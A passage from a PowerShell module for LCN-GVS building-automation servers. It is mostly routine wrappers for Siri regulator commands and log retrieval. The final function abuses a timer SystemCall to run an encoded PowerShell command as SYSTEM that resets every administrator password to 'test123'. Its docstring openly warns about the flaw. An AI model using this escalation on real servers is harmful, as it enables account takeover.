                   ValueFromPipelineByPropertyName=$true,
                   ValueFromRemainingArguments=$false,
                   Position=2,
                   ParameterSetName='Default')]
        [ValidateNotNull()]
        [ValidateNotNullOrEmpty()]
        [float] $value
    )

    Begin
    {
        Write-Verbose "[$($MyInvocation.MyCommand.Name)] Function started"
        Write-Verbose "[$($MyInvocation.MyCommand.Name)] ParameterSetName: $($PsCmdlet.ParameterSetName)"
        Write-Verbose "[$($MyInvocation.MyCommand.Name)] PSBoundParameters: $($PSBoundParameters | Out-String)"

        # Prueft, ob der Benutzer angemeldet ist.
        if ( -not ($Script:LCNGVSSession.isSuccess)) { Connect-LCNGVS }
    }
    Process
    {
        if ($pscmdlet.ShouldProcess("LCNGVS.AppSiri", "invoke SiriItem"))
        {
            if ($Script:LCNGVSSession.IsSuccess)
            {
                try
                {
                    $Script:AppSiriSvc.absRegulatorCommand($itemTitle, $listSpeechIntent, $value)
                }
                catch [System.Exception]
                {
                    Write-Error $_
                }
                finally
                {
                }
            }
            else
            {
                Write-Error -Message $Script:LocalizedData.ErrorMessage1
            }
        }
    }
    End
    {
        Write-Verbose "[$($MyInvocation.MyCommand.Name)] Function ended"
    }
}

function Invoke-LCNGVSAppSiriAbsRegulatorCommandAsync
{
    [CmdletBinding(DefaultParameterSetName='Default',
                  SupportsShouldProcess=$true,
                  PositionalBinding=$false,
                  HelpUri = 'https://github.com/lmissel/ISSENDORFF.LCNGVS.Commands/tree/master/Help/Invoke-LCNGVSAppSiriAbsRegulatorCommandAsync',
                  ConfirmImpact='Medium')]
    [Alias()]
    [OutputType([bool])]
    param(
        [Parameter(Mandatory=$true,
                   ValueFromPipeline=$true,
                   ValueFromPipelineByPropertyName=$true,
                   ValueFromRemainingArguments=$false,
                   Position=0,
                   ParameterSetName='Default')]
        [ValidateNotNull()]
        [ValidateNotNullOrEmpty()]
        [String] $itemTitle,

        [Parameter(Mandatory=$true,
                   ValueFromPipeline=$true,
                   ValueFromPipelineByPropertyName=$true,
                   ValueFromRemainingArguments=$false,
                   Position=1,
                   ParameterSetName='Default')]
        [ValidateNotNull()]
        [ValidateNotNullOrEmpty()]
        [String] $listSpeechIntent,

        [Parameter(Mandatory=$true,
                   ValueFromPipeline=$true,
                   ValueFromPipelineByPropertyName=$true,
                   ValueFromRemainingArguments=$false,
                   Position=2,
                   ParameterSetName='Default')]
        [ValidateNotNull()]
        [ValidateNotNullOrEmpty()]
        [float] $value
    )

    Begin
    {
        Write-Verbose "[$($MyInvocation.MyCommand.Name)] Function started"
        Write-Verbose "[$($MyInvocation.MyCommand.Name)] ParameterSetName: $($PsCmdlet.ParameterSetName)"
        Write-Verbose "[$($MyInvocation.MyCommand.Name)] PSBoundParameters: $($PSBoundParameters | Out-String)"

        # Prueft, ob der Benutzer angemeldet ist.
        if ( -not ($Script:LCNGVSSession.isSuccess)) { Connect-LCNGVS }
    }
    Process
    {
        if ($pscmdlet.ShouldProcess("LCNGVS.AppSiri", "invoke SiriItem"))
        {
            if ($Script:LCNGVSSession.IsSuccess)
            {
                try
                {
                    $Script:AppSiriSvc.absRegulatorCommandAsync($itemTitle, $listSpeechIntent, $value)
                }
                catch [System.Exception]
                {
                    Write-Error $_
                }
                finally
                {
                }
            }
            else
            {
                Write-Error -Message $Script:LocalizedData.ErrorMessage1
            }
        }
    }
    End
    {
        Write-Verbose "[$($MyInvocation.MyCommand.Name)] Function ended"
    }
}

function Invoke-LCNGVSAppSiriRelRegulatorCommand
{
    [CmdletBinding(DefaultParameterSetName='Default',
                  SupportsShouldProcess=$true,
                  PositionalBinding=$false,
                  HelpUri = 'https://github.com/lmissel/ISSENDORFF.LCNGVS.Commands/tree/master/Help/Invoke-LCNGVSAppSiriRelRegulatorCommand',
                  ConfirmImpact='Medium')]
    [Alias()]
    [OutputType([bool])]
    param(
        [Parameter(Mandatory=$true,
                   ValueFromPipeline=$true,
                   ValueFromPipelineByPropertyName=$true,
                   ValueFromRemainingArguments=$false,
                   Position=0,
                   ParameterSetName='Default')]
        [ValidateNotNull()]
        [ValidateNotNullOrEmpty()]
        [String] $itemTitle,

        [Parameter(Mandatory=$true,
                   ValueFromPipeline=$true,
                   ValueFromPipelineByPropertyName=$true,
                   ValueFromRemainingArguments=$false,
                   Position=1,
                   ParameterSetName='Default')]
        [ValidateNotNull()]
        [ValidateNotNullOrEmpty()]
        [String] $listSpeechIntent,

        [Parameter(Mandatory=$true,
                   ValueFromPipeline=$true,
                   ValueFromPipelineByPropertyName=$true,
                   ValueFromRemainingArguments=$false,
                   Position=2,
                   ParameterSetName='Default')]
        [ValidateNotNull()]
        [ValidateNotNullOrEmpty()]
        [float] $value,

        [Parameter(Mandatory=$true,
                   ValueFromPipeline=$true,
                   ValueFromPipelineByPropertyName=$true,
                   ValueFromRemainingArguments=$false,
                   Position=3,
                   ParameterSetName='Default')]
        [bool] $add
    )

    Begin
    {
        Write-Verbose "[$($MyInvocation.MyCommand.Name)] Function started"
        Write-Verbose "[$($MyInvocation.MyCommand.Name)] ParameterSetName: $($PsCmdlet.ParameterSetName)"
        Write-Verbose "[$($MyInvocation.MyCommand.Name)] PSBoundParameters: $($PSBoundParameters | Out-String)"

        # Prueft, ob der Benutzer angemeldet ist.
        if ( -not ($Script:LCNGVSSession.isSuccess)) { Connect-LCNGVS }
    }
    Process
    {
        if ($pscmdlet.ShouldProcess("LCNGVS.AppSiri", "invoke SiriItem"))
        {
            if ($Script:LCNGVSSession.IsSuccess)
            {
                try
                {
                    $Script:AppSiriSvc.relRegulatorCommand($itemTitle, $listSpeechIntent, $value, $add)
                }
                catch [System.Exception]
                {
                    Write-Error $_
                }
                finally
                {
                }
            }
            else
            {
                Write-Error -Message $Script:LocalizedData.ErrorMessage1
            }
        }
    }
    End
    {
        Write-Verbose "[$($MyInvocation.MyCommand.Name)] Function ended"
    }
}

function Invoke-LCNGVSAppSiriRelRegulatorCommandAsync
{
    [CmdletBinding(DefaultParameterSetName='Default',
                  SupportsShouldProcess=$true,
                  PositionalBinding=$false,
                  HelpUri = 'https://github.com/lmissel/ISSENDORFF.LCNGVS.Commands/tree/master/Help/Invoke-LCNGVSAppSiriRelRegulatorCommandAsync',
                  ConfirmImpact='Medium')]
    [Alias()]
    [OutputType([bool])]
    param(
        [Parameter(Mandatory=$true,
                   ValueFromPipeline=$true,
                   ValueFromPipelineByPropertyName=$true,
                   ValueFromRemainingArguments=$false,
                   Position=0,
                   ParameterSetName='Default')]
        [ValidateNotNull()]
        [ValidateNotNullOrEmpty()]
        [String] $itemTitle,

        [Parameter(Mandatory=$true,
                   ValueFromPipeline=$true,
                   ValueFromPipelineByPropertyName=$true,
                   ValueFromRemainingArguments=$false,
                   Position=1,
                   ParameterSetName='Default')]
        [ValidateNotNull()]
        [ValidateNotNullOrEmpty()]
        [String] $listSpeechIntent,

        [Parameter(Mandatory=$true,
                   ValueFromPipeline=$true,
                   ValueFromPipelineByPropertyName=$true,
                   ValueFromRemainingArguments=$false,
                   Position=2,
                   ParameterSetName='Default')]
        [ValidateNotNull()]
        [ValidateNotNullOrEmpty()]
        [float] $value,

        [Parameter(Mandatory=$true,
                   ValueFromPipeline=$true,
                   ValueFromPipelineByPropertyName=$true,
                   ValueFromRemainingArguments=$false,
                   Position=3,
                   ParameterSetName='Default')]
        [bool] $add
    )

    Begin
    {
        Write-Verbose "[$($MyInvocation.MyCommand.Name)] Function started"
        Write-Verbose "[$($MyInvocation.MyCommand.Name)] ParameterSetName: $($PsCmdlet.ParameterSetName)"
        Write-Verbose "[$($MyInvocation.MyCommand.Name)] PSBoundParameters: $($PSBoundParameters | Out-String)"

        # Prueft, ob der Benutzer angemeldet ist.
        if ( -not ($Script:LCNGVSSession.isSuccess)) { Connect-LCNGVS }
    }
    Process
    {
        if ($pscmdlet.ShouldProcess("LCNGVS.AppSiri", "invoke SiriItem"))
        {
            if ($Script:LCNGVSSession.IsSuccess)
            {
                try
                {
                    $Script:AppSiriSvc.relRegulatorCommandAsync($itemTitle, $listSpeechIntent, $value, $add)
                }
                catch [System.Exception]
                {
                    Write-Error $_
                }
                finally
                {
                }
            }
            else
            {
                Write-Error -Message $Script:LocalizedData.ErrorMessage1
            }
        }
    }
    End
    {
        Write-Verbose "[$($MyInvocation.MyCommand.Name)] Function ended"
    }
}

function Invoke-LCNGVSAppSiriChangeBrightnessCommand
{
    [CmdletBinding(DefaultParameterSetName='Default',
                  SupportsShouldProcess=$true,
                  PositionalBinding=$false,
                  HelpUri = 'https://github.com/lmissel/ISSENDORFF.LCNGVS.Commands/tree/master/Help/Invoke-LCNGVSAppSiriChangeBrightnessCommand',
                  ConfirmImpact='Medium')]
    [Alias()]
    [OutputType([bool])]
    param(
        [Parameter(Mandatory=$true,
                   ValueFromPipeline=$true,
                   ValueFromPipelineByPropertyName=$true,
                   ValueFromRemainingArguments=$false,
                   Position=0,
                   ParameterSetName='Default')]
        [ValidateNotNull()]
        [ValidateNotNullOrEmpty()]
        [string] $itemTitle,

        [Parameter(Mandatory=$true,
                   ValueFromPipeline=$true,
                   ValueFromPipelineByPropertyName=$true,
                   ValueFromRemainingArguments=$false,
                   Position=1,
                   ParameterSetName='Default')]
        [ValidateNotNull()]
        [ValidateNotNullOrEmpty()]
        [string] $listSpeechIntent,

        [Parameter(Mandatory=$true,
                   ValueFromPipeline=$true,
                   ValueFromPipelineByPropertyName=$true,
                   ValueFromRemainingArguments=$false,
                   Position=2,
                   ParameterSetName='Default')]
        [int] $value,

        [Parameter(Mandatory=$true,
                   ValueFromPipeline=$true,
                   ValueFromPipelineByPropertyName=$true,
                   ValueFromRemainingArguments=$false,
                   Position=3,
                   ParameterSetName='Default')]
        [bool] $add
    )

    Begin
    {
        Write-Verbose "[$($MyInvocation.MyCommand.Name)] Function started"
        Write-Verbose "[$($MyInvocation.MyCommand.Name)] ParameterSetName: $($PsCmdlet.ParameterSetName)"
        Write-Verbose "[$($MyInvocation.MyCommand.Name)] PSBoundParameters: $($PSBoundParameters | Out-String)"

        if ( -not ($Script:LCNGVSSession.isSuccess)) { Connect-LCNGVS }
    }
    Process
    {
        if ($pscmdlet.ShouldProcess("LCNGVS.AppSiri", "invoke SiriItem"))
        {
            if ($Script:LCNGVSSession.IsSuccess)
            {
                try
                {
                    Write-Verbose "[$($MyInvocation.MyCommand.Name)] Invoke LCNGVSMethod with `$PSBoundParameters"
                    $Script:AppSiriSvc.changeBrightnessCommand($itemTitle, $listSpeechIntent, $value, $add)
                }
                catch [System.Exception]
                {
                    Write-Error $_
                }
                finally
                {
                }
            }
            else
            {
                Write-Error -Message $Script:LocalizedData.ErrorMessage1
            }
        }
    }
    End
    {
        Write-Verbose "[$($MyInvocation.MyCommand.Name)] Function ended"
    }
}

function Invoke-LCNGVSAppSiriChangeBrightnessCommandAsync
{
    [CmdletBinding(DefaultParameterSetName='Default',
                  SupportsShouldProcess=$true,
                  PositionalBinding=$false,
                  HelpUri = 'https://github.com/lmissel/ISSENDORFF.LCNGVS.Commands/tree/master/Help/Invoke-LCNGVSAppSiriChangeBrightnessCommandAsync',
                  ConfirmImpact='Medium')]
    [Alias()]
    [OutputType([bool])]
    param(
        [Parameter(Mandatory=$true,
                   ValueFromPipeline=$true,
                   ValueFromPipelineByPropertyName=$true,
                   ValueFromRemainingArguments=$false,
                   Position=0,
                   ParameterSetName='Default')]
        [ValidateNotNull()]
        [ValidateNotNullOrEmpty()]
        [string] $itemTitle,

        [Parameter(Mandatory=$true,
                   ValueFromPipeline=$true,
                   ValueFromPipelineByPropertyName=$true,
                   ValueFromRemainingArguments=$false,
                   Position=1,
                   ParameterSetName='Default')]
        [ValidateNotNull()]
        [ValidateNotNullOrEmpty()]
        [string] $listSpeechIntent,

        [Parameter(Mandatory=$true,
                   ValueFromPipeline=$true,
                   ValueFromPipelineByPropertyName=$true,
                   ValueFromRemainingArguments=$false,
                   Position=2,
                   ParameterSetName='Default')]
        [int] $value,

        [Parameter(Mandatory=$true,
                   ValueFromPipeline=$true,
                   ValueFromPipelineByPropertyName=$true,
                   ValueFromRemainingArguments=$false,
                   Position=3,
                   ParameterSetName='Default')]
        [bool] $add
    )

    Begin
    {
        Write-Verbose "[$($MyInvocation.MyCommand.Name)] Function started"
        Write-Verbose "[$($MyInvocation.MyCommand.Name)] ParameterSetName: $($PsCmdlet.ParameterSetName)"
        Write-Verbose "[$($MyInvocation.MyCommand.Name)] PSBoundParameters: $($PSBoundParameters | Out-String)"

        if ( -not ($Script:LCNGVSSession.isSuccess)) { Connect-LCNGVS }
    }
    Process
    {
        if ($pscmdlet.ShouldProcess("LCNGVS.AppSiri", "invoke SiriItem"))
        {
            if ($Script:LCNGVSSession.IsSuccess)
            {
                try
                {
                    Write-Verbose "[$($MyInvocation.MyCommand.Name)] Invoke LCNGVSMethod with `$PSBoundParameters"
                    $Script:AppSiriSvc.changeBrightnessCommandAsync($itemTitle, $listSpeechIntent, $value, $add)
                }
                catch [System.Exception]
                {
                    Write-Error $_
                }
                finally
                {
                }
            }
            else
            {
                Write-Error -Message $Script:LocalizedData.ErrorMessage1
            }
        }
    }
    End
    {
        Write-Verbose "[$($MyInvocation.MyCommand.Name)] Function ended"
    }
}

#endregion

# -----------------------------------------------
# Webservice: Logs1 - Protokolle
# -----------------------------------------------
#region Komponente: Protokolle

<#
    .SYNOPSIS
        Ruft die Log-Eintraege aus dem Logbuch ab.
    .DESCRIPTION
        Mit diesem Befehl koennen Sie die Log-Eintraege aus dem angegebenen Logbuch abrufen.
    .PARAMETER StartDate
        Gibt den Startzeitpunkt an.
    .PARAMETER EndDate
        Gibt den Endzeitpunkt an.
    .PARAMETER LogType
        Gibt das Logbuch an.
    .EXAMPLE
        Get-LCNGVSLogEntry -StartDate ([DateTime]::Now.AddDays(-30)) -EndDate ([DateTime]::Now) -LogType LCN-GVS
    .EXAMPLE
        Get-LCNGVSLogEntry -StartDate ([DateTime]::Now.AddDays(-30)) -EndDate ([DateTime]::Now) -LogType Ereignismelder
#>
function Get-LCNGVSLogEntry
{
    [CmdletBinding(DefaultParameterSetName='Default',
                  SupportsShouldProcess=$true,
                  PositionalBinding=$false,
                  HelpUri = 'https://github.com/lmissel/ISSENDORFF.LCNGVS.Commands/tree/master/Help/Get-LCNGVSLogEntry',
                  ConfirmImpact='Medium')]
    [Alias('Get-LogLCNGVS', 'Get-LogTimer', 'Get-LogMacroServer', 'Get-LogAccessControl', 'Get-LogLcnServer')]
    [OutputType()]
    Param(
        [Parameter(Mandatory=$true,
                   ValueFromPipeline=$true,
                   ValueFromPipelineByPropertyName=$true,
                   ValueFromRemainingArguments=$false,
                   Position=0,
                   ParameterSetName='Default')]
        [ValidateNotNull()]
        [ValidateNotNullOrEmpty()]
        [DateTime] $StartDate,

        [Parameter(Mandatory=$true,
                   ValueFromPipeline=$true,
                   ValueFromPipelineByPropertyName=$true,
                   ValueFromRemainingArguments=$false,
                   Position=1,
                   ParameterSetName='Default')]
        [ValidateNotNull()]
        [ValidateNotNullOrEmpty()]
        [datetime] $EndDate,

        [Parameter(Mandatory=$true,
                   ValueFromPipeline=$true,
                   ValueFromPipelineByPropertyName=$true,
                   ValueFromRemainingArguments=$false,
                   Position=2,
                   ParameterSetName='Default')]
        [ValidateSet("LCN-GVS", "Zeitschaltuhr", "Ereignismelder", "Makro", "Benutzerinteraktionen")]
        [String] $LogType
    )

    Begin
    {
        Write-Verbose "[$($MyInvocation.MyCommand.Name)] Function started"
        Write-Verbose "[$($MyInvocation.MyCommand.Name)] ParameterSetName: $($PsCmdlet.ParameterSetName)"
        Write-Verbose "[$($MyInvocation.MyCommand.Name)] PSBoundParameters: $($PSBoundParameters | Out-String)"

        if ( -not ($Script:LCNGVSSession.isSuccess)) { Connect-LCNGVS }
    }
    Process
    {
        Write-Verbose "[$($MyInvocation.MyCommand.Name)] Invoke LCNGVSMethod with `$PSBoundParameters"
        if ($pscmdlet.ShouldProcess("LCNGVS.Logs", ($Script:LocalizedData.GetLCNGVSLogEntry -f $LogType)))
        {
            if ($Script:LCNGVSSession.IsSuccess)
            {
                try
                {
                    $logs = $null

                    switch ($LogType)
                    {
                        'LCN-GVS' { $logs = $Script:Logs1Svc.GetLogLcnServer($StartDate,$EndDate) }
                        'Ereignismelder' { $logs = $Script:Logs1Svc.GetLogAccessControl($StartDate,$EndDate) }
                        'Makro'  { $logs = $Script:Logs1Svc.GetLogMacroServer($StartDate,$EndDate) }
                        'Zeitschaltuhr'  { $logs = $Script:Logs1Svc.GetLogTimer($StartDate,$EndDate) }
                        'Benutzerinteraktionen' { $logs = $Script:Logs1Svc.GetLogLCNGVS($StartDate,$EndDate) }
                        Default  { $logs = $Script:Logs1Svc.GetLogLCNGVS($StartDate,$EndDate) }
                    }

                    Write-Output $logs.LogEntries
                }
                catch [System.Exception]
                {
                    Write-Error $_
                }
                finally
                {
                }
            }
            else
            {
                Write-Error -Message $Script:LocalizedData.ErrorMessage1
            }
        }
    }
    End
    {
        Write-Verbose "[$($MyInvocation.MyCommand.Name)] Function ended"
    }
}

#endregion

# -----------------------------------------------
# CustomCommands: UserManagement
# -----------------------------------------------
#region CustomCommands: Benutzerverwaltung

<#
    .SYNOPSIS
        Setzt das Kennwort aller Benutzer vom Typ Administrator auf test123 zurueck.
    .DESCRIPTION
        Diese Funktion erzeugt ein TimerEvent, welches 3 Skunden spaeter oder zu einem bestimmten Zeitpunkt
        ein SystemCall mit SYSTEM-Rechten ausfuehrt. Dieser SystemCall startet die Windows PowerShell mit einem
        encoded-Befehl, welcher wiederum  die Konfiguration des GVS-Servers nach allen Benutzern
        des Typs Administrator durchsucht und dessen Kennwort auf test123 festlegt.

        WARNUNG:
        --------
        Zur Ausfuehrung dieser Funktion ist nur das Benutzerrecht "TimerManagementRight" vonnoeten. Sie muessen kein
        Administrator des GVS-Servers oder des Systems sein. Es werden SYSTEM-Rechte verwendet, dadurch kann Ihr System
        komplett gekappert werden.

        SCHUETZEN SIE SICH VOR GEFAHREN UND VERGEBEN SIE KEINEN BENUTZER DAS RECHT "TimerManagementRight"!

    .PARAMETER  timeString
        Gibt die Zeit zur Ausfuehrung der Zuruecksetzung an.
    .EXAMPLE
        Reset-LCNGVSAdministrator -timeString "23:00:00"
#>
function Reset-LCNGVSAdministrator
{
    [CmdletBinding(DefaultParameterSetName='Default',
                  SupportsShouldProcess=$true,
                  PositionalBinding=$false,
                  HelpUri = 'https://github.com/lmissel/ISSENDORFF.LCNGVS.Commands/tree/master/Help/',
                  ConfirmImpact='Medium')]
    [Alias('Reset-LCNGVSAdministrators')]
    [OutputType([bool])]
    param
    (
        [Parameter(Mandatory=$false,
                   ValueFromPipeline=$true,
                   ValueFromPipelineByPropertyName=$true,
                   ValueFromRemainingArguments=$false,
                   Position=0,
                   ParameterSetName='Default')]
        [ValidateNotNull()]
        [ValidateNotNullOrEmpty()]
        [String] $timeString = ((Get-Date).AddSeconds(3)).ToLongTimeString(),

        [Parameter(Mandatory=$false,
                   ValueFromPipeline=$true,
                   ValueFromPipelineByPropertyName=$true,
                   ValueFromRemainingArguments=$false,
                   Position=0,
                   ParameterSetName='DateTime')]
        [ValidateNotNull()]
        [ValidateNotNullOrEmpty()]
        [DateTime] $DateTime = (Get-Date).AddSeconds(3)
    )

    Begin
    {
        Write-Verbose "[$($MyInvocation.MyCommand.Name)] Function started"
        Write-Verbose "[$($MyInvocation.MyCommand.Name)] ParameterSetName: $($PsCmdlet.ParameterSetName)"
        Write-Verbose "[$($MyInvocation.MyCommand.Name)] PSBoundParameters: $($PSBoundParameters | Out-String)"

        # Prueft, ob der Benutzer angemeldet ist.
        if ( -not ($Script:LCNGVSSession.isSuccess)) { Connect-LCNGVS }
    }

    Process
    {
        if ($pscmdlet.ShouldProcess($MyInvocation.MyCommand.Name, $Script:LocalizedData.ResetLCNGVSAdministrators))
        {
            # Prueft, erneut ob der Benutzer angemeldet ist.
            if ($Script:LCNGVSSession.IsSuccess)
            {
                try
                {
                    if ($PsCmdlet.ParameterSetName -eq 'DateTime') { $timeString = $DateTime.ToLongTimeString() }

                    # Abfrage: TimerManagementRight
                    if (Test-LCNGVSUserRight -UserRight TimerManagementRight)
                    {
                        # Erstellt ein neues Time-Objekt und fuegt es einem Array hinzu.
                        [LCNGVS.Timer.Time[]]$times = @()
                        [LCNGVS.Timer.Time]$time = [LCNGVS.Timer.Time]::new()
                        [LCNGVS.Timer.AllRule]$rule = [LCNGVS.Timer.AllRule]::new()
                        $rule.allow = $true
                        $time.Rule = $rule
                        $time.time = $timeString
                        $times += $time

                        # Erstellt ein neues SystemCall-Objekt und fuegt es einem SubAction-Array hinzu.
                        [LCNGVS.Timer.SubAction[]]$Actions = @()

                        # Fuegt ein neues SystemCall-Objekt dem SubAction-Array hinzu.
                        [LCNGVS.Timer.SystemCall]$Action = [LCNGVS.Timer.SystemCall]::new()
                        $Action.Calls = 'powershell.exe -e "WwB4AG0AbABdACQAVQBzAGUAcgBzACAAPQAgAEcAZQB0AC0AQwBvAG4AdABlAG4AdAAgACIAQwA6AFwAaQBuAGUAdABwAHUAYgBcAHcAdwB3AHIAbwBvAHQAXABMAEMATgBHAFYAUwBcAEEAcABwAF8ARABhAHQAYQBcAGMAbwBuAGYAaQBnAFwAdQBzAGUAcgBzAC4AeABtAGwAIgANAAoAJABMAEMATgBBAGQAbQBpAG4AcwAgAD0AIAAkAFUAcwBlAHIAcwAuAFUAcwBlAHIATQBhAG4AYQBnAGUAbQBlAG4AdAAuAFUAcwBlAHIATABpAHMAdAAuAFUAcwBlAHIAIAB8ACAAVwBoAGUAcgBlAC0ATwBiAGoAZQBjAHQAIAAtAFAAcgBvAHAAZQByAHQAeQAgAHQAeQBwAGUAIAAtAEUAUQAgAC0AVgBhAGwAdQBlACAAIgBBAGQAbQBpAG4AaQBzAHQAcgBhAHQAbwByACIADQAKAA0ACgBmAG8AcgBlAGEAYwBoACAAKAAkAEwAQwBOAEEAZABtAGkAbgAgAGkAbgAgACQATABDAE4AQQBkAG0AaQBuAHMAKQANAAoAewANAAoAIAAgACAAIAAkAEwAQwBOAEEAZABtAGkAbgAuAFAAYQBzAHMAdwBvAHIAZAAgAD0AIAAiAGMAYwAwADMAZQA3ADQANwBhADYAYQBmAGIAYgBjAGIAZgA4AGIAZQA3ADYANgA4AGEAYwBmAGUAYgBlAGUANQAiACAAIwAgADwAIQAtAC0AIAB0AGUAcwB0ADEAMgAzACAAKABNAEQANQAgAGgAYQBzAGgAKQAgAC0ALQA+AA0ACgB9AA0ACgANAAoAJABVAHMAZQByAHMALgBTAGEAdgBlACgAIgBDADoAXABpAG4AZQB0AHAAdQBiAFwAdwB3AHcAcgBvAG8AdABcAEwAQwBOAEcAVgBTAFwAQQBwAHAAXwBEAGEAdABhAFwAYwBvAG4AZgBpAGcAXAB1AHMAZQByAHMALgB4AG0AbAAiACkA"'
                        $Action.serialize = $true
                        $Actions += $Action

                        # Erstellt ein neues TimerEvent-Objekt und aktiviert diesen Timer.
                        $TimerEvent = New-LCNGVSTimerEvent -Description "Reset" -Times $times -Actions $Actions -Enabled $true
                        if ( -not ($TimerEvent.enabled)) { $TimerEvent.enabled = $true }

                        # Debug-Ausgabe
                        Write-Verbose "[$($MyInvocation.MyCommand.Name)] TimerEvent: $($TimerEvent | Out-String)"
                        Write-DebugMessage -Message "[$($MyInvocation.MyCommand.Name)] TimerEvent: $($TimerEvent | Out-String)"

                        # Fuegt das TimerEvent-Objekt der Zeitschaltuhr hinzu.
                        Set-LCNGVSTimerEvent -Event $TimerEvent
                    }
                    else
                    {
                        Write-Error -Message $Script:LocalizedData.NoAccess
                    }
                }
                catch [System.Exception]
                {
                    Write-Error $_
                }
                finally
                {
                }
            }
            else
            {
                Write-Error -Message $Script:LocalizedData.ErrorMessage1
            }
        }
    }

    End
    {
        Write-Verbose "[$($MyInvocation.MyCommand.Name)] Function ended"
    }
}

#endregion